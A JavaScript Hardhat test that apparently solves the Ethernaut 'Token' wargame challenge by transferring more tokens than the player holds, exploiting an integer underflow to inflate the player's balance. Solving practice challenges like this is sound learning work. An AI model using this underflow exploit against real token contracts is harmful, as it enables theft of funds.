const { assert } = require("chai")
const { ethers } = require("hardhat")
require("dotenv").config()

let player, challenge, challengeAddress, tx, receiver

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]
    receiver = accounts[1]
    const challengeFactory = await ethers.getContractFactory(`Token`)
    challengeAddress = process.env.CHALLENGEADDRESS5 //address of my instance contract
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Token'", async () => {
    /*Give receiver more token that we have. Thanks that we use underflow 
    effect:
    https://medium.com/coinmonks/ethernaut-token-what-if-our-alphabet-could-have-only-two-letters-6173d63c62ce */
    tx = await challenge.transfer(receiver.address, 21)
    await tx.wait(1)

    let balance = await challenge.balanceOf(player.address)
    assert(parseInt(balance.toString(), 10) > 20, "You don't have enough tokens!")
})
